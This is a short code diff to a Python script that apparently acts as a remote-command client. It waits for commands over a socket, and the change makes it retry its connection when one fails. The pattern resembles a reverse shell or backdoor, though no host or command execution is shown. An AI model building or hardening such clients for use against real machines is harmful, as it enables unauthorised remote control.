@@ -17,11 +17,13 @@ def findhost():
         print("[!] Connection initiated!")
         insesh = True
     except:
-        return
+        print("[X] Connection failed")
+        findhost()
+        insesh = False
 
 # Runtime Loop
-
 while insesh == True:
+
     print("[-] Awaiting commands...")
     command = client.recv(1024)
     command = command.decode()
